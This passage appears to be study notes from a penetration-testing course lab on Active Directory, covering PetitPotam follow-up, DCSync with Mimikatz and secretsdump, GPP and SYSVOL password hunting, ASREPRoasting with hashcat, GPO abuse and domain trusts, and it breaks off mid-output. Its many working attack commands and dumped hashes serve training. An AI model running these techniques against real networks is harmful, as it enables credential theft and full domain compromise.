+SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
+```
+
+**Explanation:**
+- Pass-the-Hash with the administrator's NT hash confirms full admin access to the DC — `(Pwn3d!)`.
+
+---
+
+### Submitting a TGS Request for Ourselves Using getnthash.py
+
+An alternate route: using **getnthash.py** from PKINITtools to obtain the NT hash of the DC machine account via Kerberos U2U:
+
+```bash
+$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+313b6f423cd1ee07e91315b4919fb4ba
+```
+
+**Explanation:**
+- `-key` takes the **AS-REP encryption key** saved from the `gettgtpkinit.py` output.
+- Submits a TGS request with the PAC (Privilege Attribute Certificate) which contains the NT hash.
+- The recovered NT hash can be used to DCSync directly using `-hashes`.
+
+---
+
+### Using Domain Controller NTLM Hash to DCSync
+
+```bash
+$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
+[*] Cleanup...
+```
+
+**Explanation:**
+- Uses the DC machine account's NT hash (`313b6f...`) with Pass-the-Hash to perform DCSync directly.
+
+---
+
+### Requesting TGT and Performing PTT with DC01$ Machine Account (Windows — Rubeus)
+
+Alternatively, the base64 certificate can be used with Rubeus on a Windows attack host:
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
+
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$'
+[*] Using domain controller: 172.16.5.5:88
+[+] TGT request successful!
+[+] Ticket successfully imported!
+
+  ServiceName  :  krbtgt/INLANEFREIGHT.LOCAL
+  UserName     :  ACADEMY-EA-DC01$
+  StartTime    :  3/30/2022 3:50:25 PM
+  EndTime      :  3/31/2022 1:50:25 AM
+  RenewTill    :  4/6/2022 3:50:25 PM
+  Flags        :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType      :  rc4_hmac
+  ASREP (key)  :  2A621F62C32241F38FA68826E95521DD
+```
+
+**Explanation:**
+- `asktgt` requests a TGT using PKINIT with the base64 certificate.
+- `/ptt` injects the ticket directly into memory (Pass-the-Ticket).
+- The `ASREP (key)` is also returned and can be used for `getnthash.py`.
+
+> **Note:** You need the MS01 attack host (from Privileged Access or ACL Abuse sections) with the base64 certificate saved to perform this with Rubeus.
+
+---
+
+### Confirming the Ticket is in Memory (Windows)
+
+```powershell
+PS C:\Tools> klist
+
+Cached Tickets: (3)
+
+#0>  Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL
+     Server: krbtgt/INLANEFREIGHT.LOCAL @ INLANEFREIGHT.LOCAL
+     KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+     Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
+     Cache Flags: 0x2 -> DELEGATION
+     Kdc Called: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+**Explanation:**
+- Three tickets are cached: a forwarded TGT, the primary TGT, and a CIFS service ticket.
+- The DC machine account's TGT is now usable for further attacks.
+
+---
+
+### Performing DCSync with Mimikatz (After PetitPotam PTT)
+
+```powershell
+PS C:\Tools\mimikatz\x64> .\mimikatz.exe
+
+mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
+
+[DC] 'INLANEFREIGHT.LOCAL' will be the domain
+[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
+Object RDN : krbtgt
+
+** SAM ACCOUNT **
+SAM Username         : krbtgt
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Password last change : 10/27/2021 8:14:34 AM
+Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-502
+
+Credentials:
+  Hash NTLM: 16e26ba33e455a8c338142af8d89ffbc
+    ntlm- 0: 16e26ba33e455a8c338142af8d89ffbc
+    lm  - 0: 4562458c201a97fa19365ce901513c21
+```
+
+**Explanation:**
+- With the DC machine account TGT injected via pass-the-ticket, Mimikatz can DCSync against the domain.
+- Targeting `krbtgt` retrieves the hash needed to create a **Golden Ticket** for persistence.
+- Any privileged user's hash can be obtained the same way.
+
+---
+
+### PetitPotam Mitigations
+
+- Apply the **CVE-2021-36942 patch** to all affected hosts immediately.
+- Use **Extended Protection for Authentication** on CA Web Enrollment and Certificate Enrollment Web Service.
+- Enable **Require SSL** on those services.
+- **Disable NTLM authentication** for Domain Controllers.
+- **Disable NTLM on AD CS servers** using Group Policy.
+- **Disable NTLM for IIS** on AD CS servers where web enrollment services are in use.
+
+> Applying only the CVE-2021-36942 patch is not sufficient for organizations running AD CS. An attacker with standard domain credentials can still attack AD CS in many instances. See the **"Certified Pre-Owned"** whitepaper for further hardening and detection guidance.
+
+---
+
+### Recap — Bleeding Edge Vulnerabilities
+
+Three recent attacks were covered:
+- **NoPac (SamAccountName Spoofing)** — requires standard domain user access
+- **PrintNightmare (remote)** — requires standard domain user access
+- **PetitPotam (MS-EFSRPC)** — requires **no authentication** at all
+
+All three can lead to domain compromise relatively easily. When new attacks like these are released, build a small lab environment to practice them safely, so you are ready to use them effectively in real-world engagements. Understanding the setup also significantly improves your ability to explain the impact and remediation to clients. This was a brief glimpse into attacking AD CS — a topic that could fill an entire module.
+
+---
+
+### Request TGT Using the Certificate
+
+```bash
+$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE64_CERT> dc01.ccache
+$ export KRB5CCNAME=dc01.ccache
+$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+```
+
+**Explanation:**
+- `gettgtpkinit.py` uses PKINIT (certificate-based Kerberos pre-authentication) to exchange the certificate for a TGT for the DC machine account.
+- `export KRB5CCNAME=dc01.ccache` sets the Kerberos ticket cache file so subsequent tools use this TGT.
+- `secretsdump.py` with `-k -no-pass` uses the Kerberos ticket (no password needed) to perform DCSync and dump the administrator's hash.
+
+### PetitPotam Mitigations
+
+- Apply the CVE-2021-36942 patch immediately.
+- Enable **Extended Protection for Authentication** on AD CS servers.
+- Disable NTLM authentication on Domain Controllers and AD CS servers.
+- Require SSL for Certificate Authority Web Enrollment and Certificate Enrollment Web Service.
+
+---
+
+# 24. Miscellaneous Misconfigurations
+
+A broad understanding of AD's ins and outs helps us think outside the box and discover issues that others are likely to miss. This section covers many misconfigurations commonly found during real-world assessments.
+
+> **Scenario Setup:** Move between Windows (MS01) and Linux (`172.16.5.225`, credentials `htb-student:HTB_@cademy_stdnt!`) attack hosts as needed.
+
+---
+
+## 24.1 Exchange Related Group Membership
+
+A default installation of Microsoft Exchange (with no split-administration model) opens many attack vectors. Exchange is granted considerable privileges within the domain via users, groups, and ACLs.
+
+- The group **Exchange Windows Permissions** is not a protected group, but members can **write a DACL to the domain object** — leveraged to grant DCSync privileges. Attackers can add accounts via DACL misconfiguration or a compromised Account Operators group member. Power users and support staff in remote offices are often added to this group.
+- The **Organization Management** group (effectively Exchange's "Domain Admins") can access all domain user mailboxes. It has full control of the OU called **Microsoft Exchange Security Groups**, which contains Exchange Windows Permissions.
+- Compromising an Exchange server often leads directly to Domain Admin. Dumping credentials from an Exchange server's memory can produce tens or hundreds of cleartext credentials or NTLM hashes — because users log in to **Outlook Web Access (OWA)** and Exchange caches their credentials in memory after login.
+
+---
+
+## 24.2 PrivExchange
+
+The **PrivExchange** attack results from a flaw in the Exchange Server **PushSubscription** feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP. The Exchange service runs as **SYSTEM** and is over-privileged by default (has **WriteDacl** privileges on the domain pre-2019 Cumulative Update). This flaw can be relayed to LDAP to dump the domain NTDS database. If LDAP relay fails, it can relay to other hosts in the domain. This attack goes directly to Domain Admin with any authenticated domain user account.
+
+---
+
+## 24.3 Printer Bug (MS-RPRN)
+
+The Printer Bug is a flaw in the **MS-RPRN** protocol (Print System Remote Protocol). This protocol defines communication of print job processing between a client and a print server. Any domain user can connect to the spool's named pipe using `RpcOpenPrinter` and force the server to authenticate over SMB to a client-specified host using `RpcRemoteFindFirstPrinterChangeNotificationEx`. The spooler runs as **SYSTEM** and is installed by default on Windows servers running Desktop Experience.
+
+The attack can be used to:
+- Relay to LDAP and grant the attacker account DCSync privileges.
+- Relay LDAP authentication and grant **Resource-Based Constrained Delegation (RBCD)** privileges for a computer account under our control.
+- Compromise a DC in a partner domain/forest (if Unconstrained Delegation is enabled and TGT delegation is allowed across the trust).
+
+### Enumerating for MS-PRN Printer Bug
+
+```powershell
+PS C:\htb> Import-Module .\SecurityAssessment.ps1
+PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
+
+ComputerName                        Status
+------------                        ------
+ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
+```
+
+**Explanation:**
+- `Get-SpoolStatus` from `SecurityAssessment.ps1` queries the print spooler service on the specified computer.
+- `Status: True` means the spooler is running and the host is potentially vulnerable.
+
+---
+
+## 24.4 MS14-068
+
+This was a critical flaw in the **Kerberos protocol** that allowed standard domain users to elevate to Domain Admin using forged Kerberos tickets. A Kerberos ticket contains user info including account name, ID, and group membership in the **Privilege Attribute Certificate (PAC)**, signed by the KDC to prevent tampering. The vulnerability allowed a **forged PAC to be accepted as legitimate** by the KDC — enabling creation of a fake PAC claiming membership in Domain Administrators. Exploitable with **PyKEK** or Impacket. The only defense is patching. The Hack The Box machine **"Mantis"** demonstrates this vulnerability.
+
+---
+
+## 24.5 Sniffing LDAP Credentials
+
+Many applications and printers store LDAP credentials in their web admin console to connect to the domain. These consoles are often left with **weak or default passwords**. Sometimes credentials are viewable in cleartext. Other times, the application has a **test connection function** — change the LDAP IP to the attacker's machine and set up a `netcat` listener on LDAP port 389. When the device tests the connection, it sends credentials to the attacker's machine, often in cleartext. Accounts used for LDAP connections are often privileged. In some cases, a full LDAP server may be needed to complete this attack.
+
+---
+
+## 24.6 Enumerating DNS Records with adidnsdump
+
+By default, all authenticated AD users can list the child objects of a DNS zone in AD. Standard LDAP DNS queries don't return all results, but `adidnsdump` enumerates all records. This is especially helpful when hostnames are non-descriptive (e.g., `SRV01934.INLANEFREIGHT.LOCAL`) — DNS records may reveal friendly names like `JENKINS.INLANEFREIGHT.LOCAL` that help plan attacks.
+
+### Using adidnsdump
+
+```bash
+$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+
+Password:
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Querying zone for records
+[+] Found 27 records
+```
+
+### Viewing the Contents of the records.csv File
+
+```bash
+$ head records.csv
+
+type,name,value
+?,LOGISTICS,?
+AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
+AAAA,ForestDnsZones,dead:beef::231
+A,ForestDnsZones,10.129.202.29
+A,ForestDnsZones,172.16.5.240
+A,ForestDnsZones,172.16.5.5
+```
+
+**Explanation:**
+- Some records appear as `?,LOGISTICS,?` — unknown records with no resolved IP.
+- Results are saved to `records.csv` for review.
+
+### Using the -r Option to Resolve Unknown Records
+
+```bash
+$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
+
+[+] Found 27 records
+```
+
+### Finding Hidden Records in the records.csv File
+
+```bash
+$ head records.csv
+
+type,name,value
+A,LOGISTICS,172.16.5.240
+AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
+...
+```
+
+**Explanation:**
+- `-r` performs A record queries to resolve the unknown entries — `LOGISTICS` now resolves to `172.16.5.240`.
+- In larger environments this can uncover "hidden" hosts not found via BloodHound or other enumeration, leading to new attack targets.
+
+---
+
+## 24.7 Password in Description Field
+
+Sensitive information such as account passwords are sometimes found in the **Description** or **Notes** fields of user accounts.
+
+### Finding Passwords in the Description Field using Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
+
+samaccountname description
+-------------- -----------
+administrator  Built-in account for administering the computer/domain
+guest          Built-in account for guest access to the computer/domain
+krbtgt         Key Distribution Center Service Account
+ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
+```
+
+**Explanation:**
+- Filters all domain users for accounts with a non-null description field.
+- The `ldap.agent` account has a plaintext password (`Sunsh1ne4All!`) stored directly in the description — a serious misconfiguration.
+- For large domains, export to CSV with `| Export-Csv -Path ad_users_desc.csv -NoTypeInformation` for offline review.
+
+---
+
+## 24.8 PASSWD_NOTREQD Field
+
+The `passwd_notreqd` field in the `userAccountControl` attribute means the account is **not subject to the current password policy** — they could have a shorter password or no password at all (if empty passwords are allowed). This flag may be set intentionally (admins not wanting out-of-hours calls) or accidentally, or by a vendor product during installation that never removed it. Just because the flag is set doesn't mean no password is set — just that one may not be required.
+
+### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                         useraccountcontrol
+--------------                                                         ------------------
+guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
+**Explanation:**
+- Several accounts have `PASSWD_NOTREQD` set — worth testing each for blank or weak passwords.
+- Should always be reported to clients in a comprehensive assessment.
+
+---
+
+## 24.9 Credentials in SMB Shares and SYSVOL Scripts
+
+The SYSVOL share is a **treasure trove** readable by all authenticated domain users. It contains batch, VBScript, and PowerShell scripts in the scripts directory. Always dig through this directory — old scripts may contain disabled accounts or old passwords; sometimes plaintext credentials for active accounts.
+
+### Discovering an Interesting Script
+
+```powershell
+PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/18/2021  10:44 AM            174 daily-runs.zip
+-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1
+-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm
+-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs
+```
+
+**Explanation:**
+- `reset_local_admin_pass.vbs` is immediately interesting — it suggests this script resets a local admin password.
+
+### Finding a Password in the Script
+
+```powershell
+PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
+
+On Error Resume Next
+strComputer = "."
+
+Set oShell = CreateObject("WScript.Shell")
+sUser = "Administrator"
+sPwd = "!ILFREIGHT_L0cALADmin!"
+
+Set Arg = WScript.Arguments
+If  Arg.Count > 0 Then
+sPwd = Arg(0) 'Pass the password as parameter to the script
+End if
+
+'Get the administrator name
+Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+
+<SNIP>
+```
+
+**Explanation:**
+- The script contains a **plaintext password** (`!ILFREIGHT_L0cALADmin!`) for the built-in local Administrator on Windows hosts.
+- Test if this password is still in use on domain hosts with: `crackmapexec smb <target> -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth`.
+
+---
+
+## 24.10 Group Policy Preferences (GPP) Passwords
+
+When a new GPP is created, an `.xml` file is created in the SYSVOL share and cached locally on endpoints. Files that can contain passwords include: `drives.xml`, `printers.xml`, `services.xml`, `scheduledtasks.xml`, and GPPs used to change local admin passwords. The `cpassword` attribute is AES-256 encrypted, but Microsoft **published the AES private key on MSDN** — making it trivially decryptable by any domain user.
+
+This was patched in **MS14-025** to prevent setting new GPP passwords, but the patch does **not** remove existing `Groups.xml` files. If the GPP policy is deleted instead of unlinked from the OU, the cached copy on local computers remains.
+
+### Decrypting the Password with gpp-decrypt
+
+```bash
+$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
+
+Password1
+```
+
+**Explanation:**
+- `gpp-decrypt` takes the base64-encoded `cpassword` value from the `Groups.xml` file and decrypts it using the publicly known AES key.
+
+### Locating and Retrieving GPP Passwords with CrackMapExec
+
+```bash
+$ crackmapexec smb -L | grep gpp
+
+[*] gpp_autologin    Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password     Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+```
+
+**Explanation:**
+- CrackMapExec has two GPP modules: `gpp_password` finds and decrypts `cpassword` values; `gpp_autologin` searches for autologon credentials in `Registry.xml`.
+
+### Using CrackMapExec's gpp_autologin Module
+
+```bash
+$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
+
+SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
+GPP_AUTO...  [+] Found SYSVOL share
+GPP_AUTO...  [*] Searching for Registry.xml
+GPP_AUTO...  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
+GPP_AUTO...  [+] Found credentials in Registry.xml
+GPP_AUTO...  Usernames: ['guarddesk']
+GPP_AUTO...  Domains: ['INLANEFREIGHT.LOCAL']
+GPP_AUTO...  Passwords: ['ILFreightguardadmin!']
+```
+
+**Explanation:**
+- Discovers autologon credentials for the `guarddesk` account stored in `Registry.xml` in SYSVOL.
+- This account likely logs in automatically at boot for a shared workstation — probably a local admin.
+- GPP passwords are often for legacy accounts; even if the account is locked or expired, **always attempt password spraying internally** — password re-use is widespread.
+
+---
+
+## 24.11 ASREPRoasting
+
+It is possible to obtain the **Ticket Granting Ticket (TGT)** for any account that has the **"Do not require Kerberos pre-authentication"** setting enabled. Many vendor installation guides specify this for service accounts. With pre-authentication, a user enters their password which encrypts a timestamp — the DC decrypts this to validate. If pre-auth is disabled, an attacker can request authentication data for that account and retrieve an encrypted TGT from the DC, then crack it offline.
+
+ASREPRoasting is similar to Kerberoasting but attacks the **AS-REP** instead of the **TGS-REP**. An SPN is not required. If an attacker has **GenericWrite** or **GenericAll** over an account, they can enable this attribute, obtain the AS-REP hash, crack it, then disable the attribute again.
+
+### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
+
+```powershell
+PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+**Explanation:**
+- `-PreauthNotRequired` filters for accounts with the `DONT_REQ_PREAUTH` UAC flag set.
+- `mmorgan` is vulnerable — their AS-REP hash can be requested and cracked offline.
+
+---
+
+### Retrieving AS-REP in Proper Format using Rubeus
+
+```powershell
+PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
+
+[*] Action: AS-REP roasting
+[*] Target User            : mmorgan
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] SamAccountName         : mmorgan
+[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE...
+```
+
+**Explanation:**
+- `asreproast` requests an AS-REP without sending a pre-authentication timestamp — no domain credentials context required, just the SAM name.
+- `/format:hashcat` formats the output directly for Hashcat mode 18200.
+- `/nowrap` prevents column wrapping so the hash can be copied directly.
+
+---
+
+### Cracking the Hash Offline with Hashcat
+
+```bash
+$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
+
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e...25c6ca:Welcome!00
+
+Status...........: Cracked
+Hash.Name........: Kerberos 5, etype 23, AS-REP
+Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
+```
+
+**Explanation:**
+- Mode `18200` is for Kerberos 5 AS-REP etype 23 (RC4).
+- Cracked password: `Welcome!00` — now usable for direct authentication as `mmorgan`.
+
+---
+
+### Retrieving the AS-REP Using Kerbrute
+
+```bash
+$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
+
+2022/04/01 13:14:17 >  [+] VALID USERNAME: sbrown@inlanefreight.local
+...
+2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3...
+```
+
+**Explanation:**
+- Kerbrute automatically retrieves the AS-REP for any users found without pre-auth during user enumeration — combining enumeration and hash retrieval in one step.
+
+---
+
+### Hunting for Users with Kerberos Pre-auth Not Required (Linux — GetNPUsers.py)
+
+```bash
+$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
+
+[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
+...
+$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345...
+```
+
+**Explanation:**
+- `GetNPUsers.py` from Impacket feeds a list of valid usernames and attempts AS-REP roasting for each one.
+- `valid_ad_users` is a text file of valid usernames (obtained from Kerbrute or other enumeration).
+- Users without the flag get a `[-]` error; any vulnerable accounts return their hash.
+- Even if the hash cannot be cracked, **always report this as a finding** — it's a risk even if the current password is strong.
+
+---
+
+## 24.12 Group Policy Object (GPO) Abuse
+
+Group Policy is an excellent hardening tool when used correctly, but if we gain rights over a GPO via ACL misconfiguration, we can leverage it for lateral movement, privilege escalation, domain compromise, and persistence. GPO abuse can be enumerated with PowerView, BloodHound, and tools like **group3r**, **ADRecon**, and **PingCastle**.
+
+GPO misconfigurations can be abused to:
+- Add additional privileges to a user (e.g., `SeDebugPrivilege`, `SeImpersonatePrivilege`)
+- Add a local admin user to one or more hosts
+- Create an immediate scheduled task on hosts for code execution
+
+---
+
+### Enumerating GPO Names with PowerView
+
+```powershell
+PS C:\htb> Get-DomainGPO | select displayname
+
+displayname
+-----------
+Default Domain Policy
+Default Domain Controllers Policy
+Deny Control Panel Access
+Disallow LM Hash
+Deny CMD Access
+Disable Forced Restarts
+Block Removable Media
+Disable Guest Account
+Service Accounts Password Policy
+Logon Banner
+Disconnect Idle RDP
+Disable NetBIOS
+AutoLogon
+GuardAutoLogon
+Certificate Services
+```
+
+**Explanation:**
+- Shows what types of security measures are in place — denying CMD access, a separate password policy for service accounts, and so on.
+- `AutoLogon` in the list may mean there's a readable password in a GPO.
+- `Certificate Services` indicates AD CS is present in the domain.
+
+---
+
+### Enumerating GPO Names with a Built-In Cmdlet
+
+```powershell
+PS C:\htb> Get-GPO -All | Select DisplayName
+
+DisplayName
+-----------
+Certificate Services
+Default Domain Policy
+Disable NetBIOS
+...
+Deny Control Panel Access
+```
+
+**Explanation:**
+- `Get-GPO -All` achieves the same result using the built-in GroupPolicy PowerShell module (requires Group Policy Management Tools installed).
+
+---
+
+### Enumerating Domain User GPO Rights
+
+```powershell
+PS C:\htb> $sid = Convert-NameToSid "Domain Users"
+PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
+
+ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl, WriteOwner
+AceQualifier          : AccessAllowed
+SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
+```
+
+**Explanation:**
+- Gets the SID for Domain Users and checks if they have any rights over GPOs.
+- The output shows Domain Users have `WriteProperty` and `WriteDacl` over this GPO — any domain user could gain full control over it and push malicious settings to all OUs the GPO is linked to.
+
+---
+
+### Converting GPO GUID to Name
+
+```powershell
+PS C:\htb> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
+
+DisplayName      : Disconnect Idle RDP
+DomainName       : INLANEFREIGHT.LOCAL
+Owner            : INLANEFREIGHT\Domain Admins
+Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
+GpoStatus        : AllSettingsEnabled
+CreationTime     : 10/28/2021 3:34:07 PM
+ModificationTime : 4/5/2022 6:54:25 PM
+```
+
+**Explanation:**
+- Resolves the GPO GUID to the human-readable name **"Disconnect Idle RDP"**.
+- In BloodHound, Domain Users show `GenericWrite`, `WriteOwner`, and `WriteDacl` over this GPO — confirming full control potential.
+- The GPO is applied to the **APPLICATION OU** containing multiple computer objects.
+
+> Use **SharpGPOAbuse** to exploit writable GPOs — add local admin users, create scheduled tasks, or configure startup scripts on affected hosts. Be careful: modifications apply to **every computer in the linked OU**. Target specific hosts where possible and always document every change.
+
+---
+
+### Further Research Recommended
+
+Familiarize yourself with the following topics for more advanced AD attacking:
+- **Active Directory Certificate Services (AD CS) attacks**
+- **Kerberos Constrained Delegation**
+- **Kerberos Unconstrained Delegation**
+- **Kerberos Resource-Based Constrained Delegation (RBCD)**
+
+---
+
+# 25. Domain Trusts Primer
+
+## 25.1 Scenario — Why Trusts Matter
+
+Many large organizations acquire new companies over time and establish a trust relationship with the new domain to avoid migrating all established objects — making integration much quicker. However, this trust can also introduce weaknesses into the environment. A subdomain with an exploitable flaw can provide a quick route into the target domain. Companies may also establish trusts with MSPs, customers, or other business units in different geographical regions.
+
+Domain trusts are often set up incorrectly and provide critical unintended attack paths. Trusts set up for convenience may never be reviewed for security implications. A **Merger & Acquisition (M&A)** can result in bidirectional trusts with acquired companies, unknowingly introducing risk if the acquired company's security posture is untested. An attacker targeting an organization may look at a softer trusted domain to gain an indirect foothold. It is not uncommon to perform Kerberoasting against a domain outside the principal domain and obtain a user with admin access within it.
+
+> **Key reporting note:** During assessments, we often find that the larger organization is completely unaware that a trust relationship exists with one or more domains. Always document and report all discovered trusts.
+
+---
+
+## 25.2 Domain Trusts Overview
+
+A trust creates a link between the authentication systems of two domains, allowing users to access resources outside their home domain. Trusts can allow one-way or two-way (bidirectional) communication.
+
+### Trust Types
+
+| Trust Type | Description |
+|---|---|
+| **Parent-Child** | Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent (e.g., `corp.inlanefreight.local` ↔ `inlanefreight.local`) |
+| **Cross-link** | A trust between child domains to speed up authentication — skips going through the root |
+| **External** | A non-transitive trust between two separate domains in separate forests not joined by a forest trust; uses SID filtering to filter out authentication requests not from the trusted domain |
+| **Tree-root** | A two-way transitive trust between a forest root domain and a new tree root domain; created by design when setting up a new tree root domain |
+| **Forest** | A transitive trust between two forest root domains |
+| **ESAE** | A bastion forest used to manage Active Directory (also called the Red Forest model) |
+
+### Transitivity
+
+| Transitive | Non-Transitive |
+|---|---|
+| Shared, 1 to many | Direct trust only |
+| Trust is shared with anyone in the forest | Not extended to next-level child domains |
+| Forest, tree-root, parent-child, and cross-link trusts are transitive | Typical for external or custom trust setups |
+
+**Analogy:** A transitive trust is like extending permission to anyone in your household (forest) to accept a package on your behalf. A non-transitive trust is giving strict orders that only you and the delivery service can handle the package — no one else in the household can sign for it.
+
+### Trust Direction
+
+- **One-way trust:** Users in the *trusted* domain can access resources in the *trusting* domain — not vice-versa.
+- **Bidirectional trust:** Users from both domains can access resources in the other. For example, in a bidirectional trust between `INLANEFREIGHT.LOCAL` and `FREIGHTLOGISTICS.LOCAL`, users in either domain can access resources in the other.
+
+---
+
+## 25.3 Enumerating Trust Relationships
+
+### Using Get-ADTrust
+
+```powershell
+PS C:\htb> Import-Module activedirectory
+PS C:\htb> Get-ADTrust -Filter *
+
+Direction               : BiDirectional
+DisallowTransivity      : False
+DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
+ForestTransitive        : False
+IntraForest             : True
+IsTreeParent            : False
+IsTreeRoot              : False
+Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
+ObjectClass             : trustedDomain
